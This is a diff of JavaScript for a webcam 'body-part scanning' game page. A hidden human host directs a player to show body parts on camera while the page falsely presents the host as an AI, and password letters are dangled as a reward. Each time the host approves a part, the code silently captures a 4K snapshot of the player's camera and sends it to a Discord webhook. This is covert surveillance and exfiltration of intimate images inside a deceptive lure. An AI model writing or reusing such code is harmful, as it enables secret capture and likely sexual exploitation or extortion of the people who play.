+
+        const playerStatusOverlay = document.getElementById('playerStatusOverlay');
+        const playerDisclaimer = document.getElementById('playerDisclaimer');
+        const disclaimerContinueBtn = document.getElementById('disclaimerContinueBtn');
+        const countdownTimerDisplay = document.getElementById('countdownTimerDisplay');
+
+        const passwordReveal = document.getElementById('passwordReveal');
+        const passwordChars = document.getElementById('passwordChars');
+        const bossMessage = document.getElementById('bossMessage');
+
+        const introChillz = document.getElementById('introChillz');
+        const accountSelection = document.getElementById('accountSelection');
+        const accountGrid = document.getElementById('accountGrid');
+        const safetyOverlay = document.getElementById('safetyOverlay');
+        const safetyText = document.getElementById('safetyText');
+
+        let channel = null;
+        let countdownTimerInterval = null;
+
+        // ============================================================
+        //  INIT SEQUENCE
+        // ============================================================
+        function startIntroSequence() {
+            introChillz.classList.add('show');
+            setTimeout(() => {
+                introChillz.classList.remove('show');
+                // Show account selection directly after intro
+                accountSelection.classList.add('show');
+                renderAccounts();
+                // Also show the intro voice prompt underneath? We'll keep account selection on top.
+                // Actually we want the player to select account first, then say "begin" to connect.
+                // So we show account selection, and the intro screen is hidden.
+                // The player will click an account, then the intro screen appears with "say begin".
+            }, 3000);
+        }
+
+        function renderAccounts() {
+            accountGrid.innerHTML = '';
+            ACCOUNTS.forEach((acc) => {
+                const div = document.createElement('div');
+                const isOnline = acc.name === ONLINE_ACCOUNT;
+                const isClickable = !acc.locked;
+                div.className = 'account-item' + (isClickable ? ' clickable' : '');
+                div.innerHTML = `
+              <div class="avatar"><img src="${acc.img}" alt="${acc.name}" /></div>
+              <div class="name">${acc.name}</div>
+              <div class="status-dot ${isOnline ? 'online' : 'offline'}"></div>
+              <div class="status-label">${isOnline ? '● online' : '○ offline'}</div>
+              <div class="error-msg" id="error-${acc.name}">an error occurred</div>
+            `;
+                if (isClickable) {
+                    div.addEventListener('click', () => {
+                        if (acc.name === 'RDM_GAMEINGS2') {
+                            // Success - proceed to game
+                            state.accountSelected = true;
+                            accountSelection.classList.remove('show');
+                            // Show safety messages
+                            safetyOverlay.classList.add('show');
+                            safetyText.textContent = 'keep your identity safe';
+                            setTimeout(() => {
+                                safetyText.textContent = "don't show your face";
+                                setTimeout(() => {
+                                    safetyOverlay.classList.remove('show');
+                                    // Show password reveal
+                                    showPasswordReveal();
+                                    // Show intro screen for voice
+                                    introScreen.style.display = 'flex';
+                                    voiceStatus.textContent = '🎤 say "begin" to connect';
+                                    voiceStatus.className = 'voice-status';
+                                }, 3000);
+                            }, 3000);
+                        } else {
+                            // Show error
+                            const err = document.getElementById(`error-${acc.name}`);
+                            if (err) {
+                                err.classList.add('show');
+                                setTimeout(() => err.classList.remove('show'), 2500);
+                            }
+                        }
+                    });
+                } else {
+                    div.style.cursor = 'default';
+                    div.addEventListener('click', () => {
+                        const err = document.getElementById(`error-${acc.name}`);
+                        if (err) {
+                            err.classList.add('show');
+                            setTimeout(() => err.classList.remove('show'), 2500);
+                        }
+                    });
+                }
+                accountGrid.appendChild(div);
+            });
+        }
+
+        function showPasswordReveal() {
+            passwordReveal.classList.add('show');
+            passwordChars.innerHTML = '';
+            PASSWORD.forEach((char, idx) => {
+                const span = document.createElement('span');
+                span.className = 'char hidden';
+                span.dataset.index = idx;
+                span.textContent = char;
+                passwordChars.appendChild(span);
+            });
+            state.revealedIndices = [];
+            state.lostIndices = [];
+            updatePasswordDisplay();
+        }
+
+        function updatePasswordDisplay() {
+            const chars = passwordChars.querySelectorAll('.char');
+            chars.forEach((el, idx) => {
+                if (state.lostIndices.includes(idx)) {
+                    el.className = 'char lost';
+                } else if (state.revealedIndices.includes(idx)) {
+                    el.className = 'char revealed';
+                } else {
+                    el.className = 'char hidden';
+                }
+            });
+            if (state.revealedIndices.length === PASSWORD.length) {
+                // All revealed - maybe celebration
+            }
+        }
+
+        function revealNextLetter() {
+            for (let i = 0; i < PASSWORD.length; i++) {
+                if (!state.revealedIndices.includes(i) && !state.lostIndices.includes(i)) {
+                    state.revealedIndices.push(i);
+                    updatePasswordDisplay();
+                    return true;
+                }
+            }
+            return false; // all revealed
+        }
+
+        function loseRandomLetter() {
+            // Find a revealed letter that hasn't been lost
+            const candidates = state.revealedIndices.filter(idx => !state.lostIndices.includes(idx));
+            if (candidates.length > 0) {
+                const idx = candidates[Math.floor(Math.random() * candidates.length)];
+                state.lostIndices.push(idx);
+                // Remove from revealed
+                state.revealedIndices = state.revealedIndices.filter(i => i !== idx);
+                updatePasswordDisplay();
+                // Show a message
+                showBossMessage('❌ Letter lost! Scan again to regain it.');
+                return true;
+            }
+            return false;
+        }
+
+        // ============================================================
+        //  BOSS MESSAGE
+        // ============================================================
+        function showBossMessage(msg) {
+            bossMessage.textContent = msg;
+            bossMessage.classList.add('show');
+            if (state.bossMsgTimeout) clearTimeout(state.bossMsgTimeout);
+            state.bossMsgTimeout = setTimeout(() => {
+                bossMessage.classList.remove('show');
+            }, 3000);
+        }
+
+        // ============================================================
+        //  SNAPSHOT (4K)
+        // ============================================================
+        function captureSnapshot(videoEl) {
+            const canvas = document.createElement('canvas');
+            const vw = videoEl.videoWidth || 1280;
+            const vh = videoEl.videoHeight || 720;
+            const targetWidth = 3840;
+            const targetHeight = Math.round(3840 * (vh / vw));
+            canvas.width = targetWidth;
+            canvas.height = targetHeight;
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(videoEl, 0, 0, canvas.width, canvas.height);
+            return canvas.toDataURL('image/jpeg', 0.92);
+        }
+
+        async function sendSnapshotToDiscord(dataUrl) {
+            try {
+                const res = await fetch(dataUrl);
+                const blob = await res.blob();
+                const formData = new FormData();
+                formData.append('file', blob, `snapshot_${Date.now()}.jpg`);
+                const payload = { content: `📸 **4K Snapshot** · ${new Date().toLocaleString()}` };
+                formData.append('payload_json', JSON.stringify(payload));
+                await fetch(DISCORD_WEBHOOK_URL, { method: 'POST', body: formData });
+                console.log('📸 Snapshot sent');
+            } catch (err) { console.error('Snapshot error:', err); }
+        }
+
+        // ============================================================
+        //  PEERJS – fixed room
+        // ============================================================
+        function initPeerJS(role) {
+            if (state.peer) { state.peer.destroy();
+                state.peer = null;
+                state.peerConnection = null;
+                state.dataConnection = null;
+                state.remoteStream = null;
+                hostVideo.srcObject = null;
+                hostVideo.style.display = 'none';
+                videoPlaceholder.style.display = 'flex'; }
+
+            const peerId = role === 'host' ? BOSS_ROOM_ID : undefined;
+            const peer = new Peer(peerId, {
+                debug: 1,
+                config: { iceServers: [{ urls: 'stun:stun.l.google.com:19302' }, { urls: 'stun:stun1.l.google.com:19302' }] }
+            });
+            state.peer = peer;
+
+            let reconnectAttempts = 0;
+            const MAX_RECONNECT = 5;
+
+            peer.on('open', (id) => {
+                console.log('PeerJS connected with ID:', id);
+                if (role === 'host') {
+                    hostStatusLabel.textContent = 'waiting for player…';
+                    hostDot.className = 'dot online';
+                    peer.on('connection', (conn) => {
+                        console.log('Data connection from player');
+                        state.dataConnection = conn;
+                        conn.on('open', () => { console.log('Data channel open'); });
+                        conn.on('data', (data) => { handleDataFromPlayer(data); });
+                    });
+                    peer.on('call', (call) => {
+                        console.log('Incoming call from player');
+                        call.answer();
+                        call.on('stream', (remoteStream) => {
+                            console.log('Received remote stream');
+                            state.remoteStream = remoteStream;
+                            hostVideo.srcObject = remoteStream;
+                            hostVideo.style.display = 'block';
+                            videoPlaceholder.style.display = 'none';
+                            state.playerConnected = true;
+                            state.playerWaitingForStart = true;
+                            hostPlayerStatus.textContent = '👤 player connected!';
+                            hostPlayerStatus.className = 'value status-text approved';
+                            hostScanStatus.textContent = '⏳ waiting for you to start…';
+                            hostScanStatus.className = 'value status-text';
+                            hostStartBtn.disabled = false;
+                            hostApproveBtn.disabled = true;
+                            hostRejectBtn.disabled = true;
+                            hostHoldBtn.disabled = true;
+                            hostDot.className = 'dot online';
+                            hostStatusLabel.textContent = 'player connected';
+                            renderBodyParts();
+                            if (channel) channel.postMessage({ type: 'player_connected' });
+                        });
+                        call.on('close', () => {
+                            console.log('Call closed');
+                            state.playerConnected = false;
+                            state.remoteStream = null;
+                            hostVideo.srcObject = null;
+                            hostVideo.style.display = 'none';
+                            videoPlaceholder.style.display = 'flex';
+                            hostPlayerStatus.textContent = '⏳ player disconnected…';
+                            hostPlayerStatus.className = 'value status-text waiting';
+                            hostScanStatus.textContent = '⏳ player disconnected…';
+                            hostScanStatus.className = 'value status-text';
+                            hostStartBtn.disabled = true;
+                            hostApproveBtn.disabled = true;
+                            hostRejectBtn.disabled = true;
+                            hostHoldBtn.disabled = true;
+                            hostDot.className = 'dot offline';
+                            hostStatusLabel.textContent = 'offline';
+                        });
+                        state.peerConnection = call;
+                    });
+                } else {
+                    // Player: connect to boss room
+                    console.log('Connecting to boss room:', BOSS_ROOM_ID);
+                    const conn = peer.connect(BOSS_ROOM_ID);
+                    conn.on('open', () => {
+                        console.log('Data connection to host established');
+                        state.dataConnection = conn;
+                        conn.on('data', (data) => { handleDataFromHost(data); });
+                        // Send our video stream
+                        const localStream = state.stream;
+                        if (localStream) {
+                            const call = peer.call(BOSS_ROOM_ID, localStream);
+                            call.on('stream', (remoteStream) => { console.log('Host stream received (ignored)'); });
+                            call.on('close', () => {
+                                console.log('Call closed by host');
+                                playerStatusOverlay.textContent = '❌ AI disconnected — say "begin" to reconnect.';
+                                playerStatusOverlay.className = 'player-status-overlay show rejected';
+                                setTimeout(() => {
+                                    state.isPlayer = false;
+                                    state.gameStarted = false;
+                                    introScreen.style.display = 'flex';
+                                    voiceStatus.textContent = '🎤 say "begin" to reconnect';
+                                    voiceStatus.className = 'voice-status';
+                                    document.querySelector('.header').style.display = 'none';
+                                    document.querySelector('.cam-overlay').style.display = 'none';
+                                    document.querySelector('.points-popup').style.display = 'none';
+                                    document.querySelector('.countdown-number').style.display = 'none';
+                                    document.querySelector('.hold-still-msg').style.display = 'none';
+                                    document.querySelector('.controls').style.display = 'none';
+                                    document.querySelector('.player-status-overlay').style.display = 'none';
+                                    statusMsg.textContent = '❌ AI disconnected — say "begin" to reconnect.';
+                                    statusMsg.className = 'status-msg error';
+                                    voiceStatus.textContent = '❌ AI disconnected';
+                                    voiceStatus.className = 'voice-status error';
+                                }, 2000);
+                            });
+                            state.peerConnection = call;
+                        } else { console.warn('No local stream available'); }
+                    });
+                    conn.on('error', (err) => {
+                        console.error('Connection error:', err);
+                        voiceStatus.textContent = '❌ failed to connect — try again';
+                        voiceStatus.className = 'voice-status error';
+                        state.isPlayer = false;
+                    });
+                }
+            });
+
+            peer.on('error', (err) => {
+                console.error('PeerJS error:', err);
+                if (role === 'host') {
+                    hostStatusLabel.textContent = 'error: ' + err.message;
+                    hostDot.className = 'dot offline';
+                    // Attempt to reconnect if not connected
+                    if (!state.playerConnected && reconnectAttempts < MAX_RECONNECT) {
+                        reconnectAttempts++;
+                        setTimeout(() => {
+                            if (!state.playerConnected && !state.peer.destroyed) {
+                                console.log('Reconnecting host peer...');
+                                state.peer.destroy();
+                                initPeerJS('host');
+                            }
+                        }, 3000 * reconnectAttempts);
+                    }
+                } else {
+                    voiceStatus.textContent = '❌ connection error: ' + err.message;
+                    voiceStatus.className = 'voice-status error';
+                }
+            });
+
+            peer.on('close', () => {
+                console.log('PeerJS closed');
+                if (role === 'host') {
+                    hostStatusLabel.textContent = 'offline';
+                    hostDot.className = 'dot offline';
+                    // Auto-reconnect if not connected
+                    if (!state.playerConnected && reconnectAttempts < MAX_RECONNECT) {
+                        reconnectAttempts++;
+                        setTimeout(() => {
+                            if (!state.playerConnected && state.peer && !state.peer.destroyed) {
+                                console.log('Reconnecting host peer...');
+                                state.peer.destroy();
+                                initPeerJS('host');
+                            }
+                        }, 5000 * reconnectAttempts);
+                    }
+                }
+            });
+        }
+
+        // ============================================================
+        //  DATA HANDLING
+        // ============================================================
+        function sendDataToPlayer(data) {
+            if (state.dataConnection && state.dataConnection.open) state.dataConnection.send(data);
+            if (channel) channel.postMessage({ ...data, _fromHost: true });
+        }
+
+        function handleDataFromHost(data) {
+            console.log('Player received:', data);
+            if (data.type === 'start_game') { startCountdownForPlayer(); } else if (data.type === 'set_part') {
+                const idx = data.index;
+                if (idx >= 0 && idx < BODY_PARTS.length) {
+                    state.currentPartIndex = idx;
+                    state.partDetected = false;
+                    state.waitingForApproval = false;
+                    state.progressValue = 0;
+                    const part = BODY_PARTS[idx];
+                    challengeTarget.textContent = part.emoji + ' ' + part.label;
+                    challengeBadge.innerHTML =
+                        `<span class="emoji">🎯</span> Show <span class="highlight">${part.emoji} ${part.label}</span>`;
+                    statusBadge.textContent = `⏳ scanning …`;
+                    statusBadge.className = 'status-badge scanning';
+                    timerDisplay.textContent = SCAN_TIME;
+                    timerBox.className = 'timer-box';
+                    progressFillEl.style.width = '0%';
+                    progressPctEl.textContent = '0%';
+                    startScanTimerForPlayer(idx);
+                }
+            } else if (data.type === 'set_progress') {
+                const val = data.value;
+                state.progressValue = val;
+                const pct = Math.round(val);
+                progressFillEl.style.width = pct + '%';
+                progressPctEl.textContent = pct + '%';
+                if (pct < 50) progressFillEl.style.background = 'linear-gradient(90deg, #8899bb, #6bcbff)';
+                else if (pct < 100) progressFillEl.style.background = 'linear-gradient(90deg, #ffd93d, #ff9100)';
+                else {
+                    progressFillEl.style.background = 'linear-gradient(90deg, #00f5c0, #00d9a0)';
+                    progressPctEl.style.color = '#00f5c0';
+                }
+                if (pct >= 100) {
+                    if (state.isScanning && !state.partDetected) {
+                        state.partDetected = true;
+                        state.isScanning = false;
+                        clearInterval(state.scanInterval);
+                        onScanComplete(state.currentPartIndex);
+                    }
+                }
+            } else if (data.type === 'approve') {
+                const part = BODY_PARTS[state.currentPartIndex];
+                if (part) {
+                    state.totalPoints += part.points;
+                    scoreDisplay.textContent = state.totalPoints;
+                    showPointsPopup(part.points);
+                    flashGreen();
+                    // Reveal a letter
+                    if (!revealNextLetter()) {
+                        // All letters already revealed, maybe show a message
+                        showBossMessage('🎉 All letters revealed!');
+                    }
+                    // Snapshot from player's own camera
+                    const snap = captureSnapshot(video);
+                    sendSnapshotToDiscord(snap);
+                    state.partResults.push({ part: part.id, label: part.label, points: part.points, success: true,
+                        time: SCAN_TIME - state.scanTimer });
+                    playerStatusOverlay.textContent = '✅ Approved!';
+                    playerStatusOverlay.className = 'player-status-overlay show approved';
+                    setTimeout(() => {
+                        let next = state.currentPartIndex + 1;
+                        if (next >= BODY_PARTS.length) next = 0;
+                        state.currentPartIndex = next;
+                        state.partDetected = false;
+                        state.waitingForApproval = false;
+                        playerStatusOverlay.textContent = '⏳ waiting for AI…';
+                        playerStatusOverlay.className = 'player-status-overlay show waiting';
+                        progressFillEl.style.width = '0%';
+                        progressPctEl.textContent = '0%';
+                        // Reset timer
+                        timerDisplay.textContent = SCAN_TIME;
+                        timerBox.className = 'timer-box';
+                    }, 1500);
+                }
+            } else if (data.type === 'reject') {
+                state.totalPoints = Math.max(0, state.totalPoints - 30);
+                scoreDisplay.textContent = state.totalPoints;
+                flashRed();
+                playerStatusOverlay.textContent = '❌ Rejected — try again';
+                playerStatusOverlay.className = 'player-status-overlay show rejected';
+                // Lose a letter
+                loseRandomLetter();
+                setTimeout(() => {
+                    state.currentPartApproved = false;
+                    state.currentPartRejected = false;
+                    state.waitingForApproval = false;
+                    playerStatusOverlay.textContent = '⏳ waiting for AI…';
+                    playerStatusOverlay.className = 'player-status-overlay show waiting';
+                    progressFillEl.style.width = '0%';
+                    progressPctEl.textContent = '0%';
+                    const idx = state.currentPartIndex;
+                    const part = BODY_PARTS[idx];
+                    challengeTarget.textContent = part.emoji + ' ' + part.label;
+                    challengeBadge.innerHTML =
+                        `<span class="emoji">🎯</span> Show <span class="highlight">${part.emoji} ${part.label}</span>`;
+                    statusBadge.textContent = `⏳ scanning …`;
+                    statusBadge.className = 'status-badge scanning';
+                    timerDisplay.textContent = SCAN_TIME;
+                    timerBox.className = 'timer-box';
+                    startScanTimerForPlayer(idx);
+                }, 2000);
+            } else if (data.type === 'hold_still') {
+                if (data.value) {
+                    holdStillMsg.classList.add('show');
+                    statusBadge.textContent = '✋ hold still …';
+                    statusBadge.className = 'status-badge hold';
+                } else {
+                    holdStillMsg.classList.remove('show');
+                    if (state.isScanning) {
+                        statusBadge.textContent = '🔍 scanning …';
+                        statusBadge.className = 'status-badge scanning';
+                    }
+                }
+            } else if (data.type === 'boss_msg') {
+                showBossMessage(data.msg);
+            }
+        }
+
+        function handleDataFromPlayer(data) { console.log('Host received from player:', data); }
+
+        // ============================================================
+        //  PLAYER COUNTDOWN & START
+        // ============================================================
+        function startCountdownForPlayer() {
+            if (state.countdownRunning) return;
+            state.countdownRunning = true;
+            let count = 3;
+            countdownNumber.textContent = count;
+            countdownNumber.className = 'countdown-number show';
+            statusBadge.textContent = `⏳ ${count}…`;
+            statusBadge.className = 'status-badge waiting';
+            const cdInterval = setInterval(() => {
+                count--;
+                if (count > 0) {
+                    countdownNumber.textContent = count;
+                    countdownNumber.className = 'countdown-number show';
+                    statusBadge.textContent = `⏳ ${count}…`;
+                } else {
+                    clearInterval(cdInterval);
+                    countdownNumber.className = 'countdown-number hide';
+                    state.countdownRunning = false;
+                    startGameOnPlayer();
+                }
+            }, 1000);
+        }
+
+        function startGameOnPlayer() {
+            state.gameStarted = true;
+            state.totalPoints = 0;
+            state.currentPartIndex = 0;
+            state.partResults = [];
+            state.isScanning = false;
+            state.partDetected = false;
+            state.waitingForApproval = false;
+            state.currentPartApproved = false;
+            state.currentPartRejected = false;
+            state.playerWaitingForStart = false;
+
+            scoreDisplay.textContent = '0';
+            timerDisplay.textContent = SCAN_TIME;
+            timerBox.className = 'timer-box';
+            playerStatusOverlay.classList.remove('show');
+
+            statusBadge.textContent = '⏳ waiting for AI to select a part…';
+            statusBadge.className = 'status-badge waiting';
+            challengeTarget.textContent = '—';
+            challengeBadge.innerHTML = `<span class="emoji">🎯</span> Show <span class="highlight">—</span>`;
+        }
+
+        function startScanTimerForPlayer(index) {
+            if (state.scanInterval) clearInterval(state.scanInterval);
+            state.isScanning = true;
+            state.partDetected = false;
+            state.scanTimer = SCAN_TIME;
+            timerDisplay.textContent = SCAN_TIME;
+            timerBox.className = 'timer-box';
+            statusBadge.textContent = `🔍 scanning …`;
+            statusBadge.className = 'status-badge scanning';
+            state.scanInterval = setInterval(() => {
+                state.scanTimer--;
+                timerDisplay.textContent = state.scanTimer;
+                if (state.scanTimer <= 5) timerBox.className = 'timer-box danger';
+                else if (state.scanTimer <= 10) timerBox.className = 'timer-box warning';
+                if (state.scanTimer <= 0 && !state.partDetected) {
+                    clearInterval(state.scanInterval);
+                    onScanFail(state.currentPartIndex);
+                }
+            }, 1000);
+        }
+
+        // ============================================================
+        //  RENDER BODY PARTS (host)
+        // ============================================================
+        function renderBodyParts() {
+            partList.innerHTML = '';
+            BODY_PARTS.forEach((part, idx) => {
+                const el = document.createElement('div');
+                el.className = 'part-item' + (idx === state.currentPartIndex ? ' active' : '');
+                const colorClass = part.color || 'green';
+                el.innerHTML =
+                    `<span class="dot-color ${colorClass}"></span><span class="part-name">${part.emoji} ${part.label}</span><span class="part-points">(${part.points}pts)</span>`;
+                el.dataset.index = idx;
+                el.addEventListener('click', () => { handlePartSelect(idx); });
+                partList.appendChild(el);
+            });
+            updateCurrentPartLabel();
+        }
+
+        function updateCurrentPartLabel() {
+            const part = BODY_PARTS[state.currentPartIndex];
+            if (part) {
+                currentPartLabel.textContent = part.emoji + ' ' + part.label;
+                currentPartLabel.style.color = getColorForPoints(part.points);
+            } else {
+                currentPartLabel.textContent = '—';
+                currentPartLabel.style.color = 'rgba(255,255,255,0.2)';
+            }
+            document.querySelectorAll('.part-item').forEach((el, idx) => {
+                el.classList.toggle('active', idx === state.currentPartIndex);
+            });
+        }
+
+        function getColorForPoints(points) {
+            if (points <= 3) return '#00f5c0';
+            if (points <= 6) return '#ffd93d';
+            if (points <= 8) return '#ff9100';
+            return '#ff3d3d';
+        }
+
+        // ============================================================
+        //  HANDLE PART SELECT (host)
+        // ============================================================
+        function handlePartSelect(index) {
+            if (!state.isHost || !state.playerConnected || !state.gameStarted) return;
+            const part = BODY_PARTS[index];
+            if (!part) return;
+
+            state.currentPartIndex = index;
+            state.partDetected = false;
+            state.waitingForApproval = false;
+            state.progressValue = 0;
+            state.hostSliderValue = 0;
+
+            progressSlider.value = 0;
+            sliderValue.textContent = '0%';
+            sliderValue.className = 'value';
+            progressFillEl.style.width = '0%';
+            progressPctEl.textContent = '0%';
+
+            updateCurrentPartLabel();
+            hostPartName.textContent = part.emoji + ' ' + part.label;
+            hostScanStatus.textContent = '⏳ scanning: ' + part.label;
+            hostScanStatus.className = 'value status-text';
+            hostPlayerStatus.textContent = '⏳ scanning: ' + part.label;
+            hostPlayerStatus.className = 'value status-text waiting';
+            hostApproveBtn.disabled = true;
+            hostRejectBtn.disabled = true;
+            hostApproveBtn.className = 'btn-host-approve';
+            hostRejectBtn.className = 'btn-host-reject';
+            hostHoldBtn.disabled = false;
+            hostHoldBtn.textContent = '✋ Hold Still';
+            hostHoldBtn.classList.remove('active');
+            state.holdStillRequested = false;
+
+            sendDataToPlayer({ type: 'set_part', index: index });
+            sendDataToPlayer({ type: 'set_progress', value: 0 });
+
+            flashGreen();
+            statusMsg.textContent = `🎯 Set part to: ${part.emoji} ${part.label}`;
+            statusMsg.className = 'status-msg success';
+            setTimeout(() => { statusMsg.textContent = '';
+                statusMsg.className = 'status-msg'; }, 2000);
+        }
+
+        // ============================================================
+        //  SLIDER HANDLER (host)
+        // ============================================================
+        progressSlider.addEventListener('input', function() {
+            if (!state.isHost || !state.playerConnected || !state.gameStarted) return;
+            const val = parseInt(this.value);
+            state.hostSliderValue = val;
+            sliderValue.textContent = val + '%';
+            if (val >= 100) sliderValue.className = 'value done';
+            else sliderValue.className = 'value';
+            sendDataToPlayer({ type: 'set_progress', value: val });
+
+            if (val >= 100) {
+                sendDataToPlayer({ type: 'approve' });
+                hostScanStatus.textContent = '✅ scan forced to 100%!';
+                hostScanStatus.className = 'value status-text approved';
+                hostApproveBtn.disabled = false;
+                hostRejectBtn.disabled = false;
+                const part = BODY_PARTS[state.currentPartIndex];
+                if (part) {
+                    state.totalPoints += part.points;
+                    state.hostScore = state.totalPoints;
+                    hostScoreDisplay.textContent = state.totalPoints;
+                }
+                state.partResults.push({ part: part.id, label: part.label, points: part.points, success: true,
+                    time: SCAN_TIME - state.scanTimer });
+                hostApproveBtn.disabled = true;
+                hostRejectBtn.disabled = true;
+                hostApproveBtn.className = 'btn-host-approve approved';
+                hostApproveBtn.textContent = '✅ Approved!';
+                setTimeout(() => {
+                    let next = state.currentPartIndex + 1;
+                    if (next >= BODY_PARTS.length) next = 0;
+                    state.currentPartIndex = next;
+                    state.currentPartApproved = false;
+                    state.currentPartRejected = false;
+                    state.waitingForApproval = false;
+                    hostApproveBtn.className = 'btn-host-approve';
+                    hostApproveBtn.textContent = '✅ Approve';
+                    hostRejectBtn.className = 'btn-host-reject';
+                    hostRejectBtn.textContent = '❌ Reject';
+                    hostApproveBtn.disabled = true;
+                    hostRejectBtn.disabled = true;
+                    hostHoldBtn.disabled = true;
+                    hostPartName.textContent = BODY_PARTS[next].emoji + ' ' + BODY_PARTS[next].label;
+                    hostScanStatus.textContent = '⏳ waiting for next scan…';
+                    hostScanStatus.className = 'value status-text';
+                    hostPlayerStatus.textContent = '⏳ waiting for next scan…';
+                    hostPlayerStatus.className = 'value status-text waiting';
+                    updateCurrentPartLabel();
+                    renderBodyParts();
+                    progressSlider.value = 0;
+                    sliderValue.textContent = '0%';
+                    sliderValue.className = 'value';
+                    state.hostSliderValue = 0;
+                    sendDataToPlayer({ type: 'set_part', index: next });
+                    sendDataToPlayer({ type: 'set_progress', value: 0 });
+                    progressFillEl.style.width = '0%';
+                    progressPctEl.textContent = '0%';
+                    hostHoldBtn.disabled = false;
+                    hostHoldBtn.textContent = '✋ Hold Still';
+                    hostHoldBtn.classList.remove('active');
+                    state.holdStillRequested = false;
+                }, 1500);
+            }
+        });
+
+        // ============================================================
+        //  HOST START GAME
+        // ============================================================
+        function hostStartGame() {
+            if (!state.isHost || !state.playerConnected) {
+                statusMsg.textContent = '❌ No player connected.';
+                statusMsg.className = 'status-msg error';
+                return;
+            }
+            if (state.gameStarted) {
+                statusMsg.textContent = '⏳ Game already started.';
+                statusMsg.className = 'status-msg error';
+                return;
+            }
+
+            state.hostGameStarted = true;
+            state.playerWaitingForStart = false;
+            hostStartBtn.disabled = true;
+            hostStartBtn.textContent = '⏳ starting…';
+
+            sendDataToPlayer({ type: 'start_game' });
+            startCountdownForHost();
+
+            hostStartBtn.textContent = '▶ Game Started';
+            hostStartBtn.disabled = true;
+            hostScanStatus.textContent = '⏳ game started — waiting for countdown…';
+            hostScanStatus.className = 'value status-text';
+            hostPlayerStatus.textContent = '👤 playing…';
+            hostPlayerStatus.className = 'value status-text approved';
+
+            statusMsg.textContent = '🎮 Game started!';
+            statusMsg.className = 'status-msg success';
+            setTimeout(() => { statusMsg.textContent = '';
+                statusMsg.className = 'status-msg'; }, 2000);
+        }
+
+        function startCountdownForHost() {
+            let count = 3;
+            countdownNumber.textContent = count;
+            countdownNumber.className = 'countdown-number show';
+            statusBadge.textContent = `⏳ ${count}…`;
+            statusBadge.className = 'status-badge waiting';
+            const cdInterval = setInterval(() => {
+                count--;
+                if (count > 0) {
+                    countdownNumber.textContent = count;
+                    countdownNumber.className = 'countdown-number show';
+                    statusBadge.textContent = `⏳ ${count}…`;
+                } else {
+                    clearInterval(cdInterval);
+                    countdownNumber.className = 'countdown-number hide';
+                    state.gameStarted = true;
+                    state.totalPoints = 0;
+                    state.currentPartIndex = 0;
+                    state.partResults = [];
+                    state.isScanning = false;
+                    state.partDetected = false;
+                    state.waitingForApproval = false;
+                    state.currentPartApproved = false;
+                    state.currentPartRejected = false;
+                    hostScoreDisplay.textContent = '0';
+                    hostPartName.textContent = BODY_PARTS[0].emoji + ' ' + BODY_PARTS[0].label;
+                    hostTimerDisplay.textContent = SCAN_TIME + 's';
+                    hostTimerDisplay.className = 'value timer';
+                    hostApproveBtn.disabled = true;
+                    hostRejectBtn.disabled = true;
+                    hostHoldBtn.disabled = true;
+                    hostApproveBtn.className = 'btn-host-approve';
+                    hostRejectBtn.className = 'btn-host-reject';
+                    hostApproveBtn.textContent = '✅ Approve';
+                    hostRejectBtn.textContent = '❌ Reject';
+                    renderBodyParts();
+                    updateCurrentPartLabel();
+                    sendDataToPlayer({ type: 'set_part', index: 0 });
+                    sendDataToPlayer({ type: 'set_progress', value: 0 });
+                    hostScanStatus.textContent = '⏳ scanning: ' + BODY_PARTS[0].label;
+                    hostScanStatus.className = 'value status-text';
+                    hostPlayerStatus.textContent = '⏳ scanning…';
+                    hostPlayerStatus.className = 'value status-text waiting';
+                    hostHoldBtn.disabled = false;
+                    hostHoldBtn.textContent = '✋ Hold Still';
+                    hostHoldBtn.classList.remove('active');
+                    state.holdStillRequested = false;
+                    state.hostTimer = SCAN_TIME;
+                    hostTimerDisplay.textContent = SCAN_TIME + 's';
+                }
+            }, 1000);
+        }
+
+        hostStartBtn.addEventListener('click', hostStartGame);
+
+        // ============================================================
+        //  HOST APPROVAL / REJECT / HOLD
+        // ============================================================
+        function hostApprove() {
+            if (!state.isHost || !state.playerConnected || !state.gameStarted) return;
+            sendDataToPlayer({ type: 'approve' });
+            hostApproveBtn.disabled = true;
+            hostRejectBtn.disabled = true;
+            hostApproveBtn.className = 'btn-host-approve approved';
+            hostApproveBtn.textContent = '✅ Approved!';
+            hostScanStatus.textContent = '✅ approved!';
+            hostScanStatus.className = 'value status-text approved';
+            hostPlayerStatus.textContent = '✅ approved!';
+            hostPlayerStatus.className = 'value status-text approved';
+            const part = BODY_PARTS[state.currentPartIndex];
+            if (part) {
+                state.totalPoints += part.points;
+                state.hostScore = state.totalPoints;
+                hostScoreDisplay.textContent = state.totalPoints;
+            }
+            state.partResults.push({ part: part.id, label: part.label, points: part.points, success: true,
+                time: SCAN_TIME - state.scanTimer });
+            flashGreen();
+            // Snapshot from host's view of player
+            const snap = captureSnapshot(hostVideo);
+            sendSnapshotToDiscord(snap);
+            // Reveal a letter on host side too (already done on player side)
+            // But we need to keep sync
+            setTimeout(() => {
+                let next = state.currentPartIndex + 1;
+                if (next >= BODY_PARTS.length) next = 0;
+                state.currentPartIndex = next;
+                state.currentPartApproved = false;
+                state.currentPartRejected = false;
+                state.waitingForApproval = false;
+                hostApproveBtn.className = 'btn-host-approve';
+                hostApproveBtn.textContent = '✅ Approve';
+                hostRejectBtn.className = 'btn-host-reject';
+                hostRejectBtn.textContent = '❌ Reject';
+                hostApproveBtn.disabled = true;
+                hostRejectBtn.disabled = true;
+                hostHoldBtn.disabled = true;
+                hostPartName.textContent = BODY_PARTS[next].emoji + ' ' + BODY_PARTS[next].label;
+                hostScanStatus.textContent = '⏳ waiting for next scan…';
+                hostScanStatus.className = 'value status-text';
+                hostPlayerStatus.textContent = '⏳ waiting for next scan…';
+                hostPlayerStatus.className = 'value status-text waiting';
+                updateCurrentPartLabel();
+                renderBodyParts();
+                progressSlider.value = 0;
+                sliderValue.textContent = '0%';
+                sliderValue.className = 'value';
+                state.hostSliderValue = 0;
+                sendDataToPlayer({ type: 'set_part', index: next });
+                sendDataToPlayer({ type: 'set_progress', value: 0 });
+                progressFillEl.style.width = '0%';
+                progressPctEl.textContent = '0%';
+                hostHoldBtn.disabled = false;
+                hostHoldBtn.textContent = '✋ Hold Still';
+                hostHoldBtn.classList.remove('active');
+                state.holdStillRequested = false;
+            }, 1500);
+        }
+
+        function hostReject() {
+            if (!state.isHost || !state.playerConnected || !state.gameStarted) return;
+            state.totalPoints = Math.max(0, state.totalPoints - 30);
+            state.hostScore = state.totalPoints;
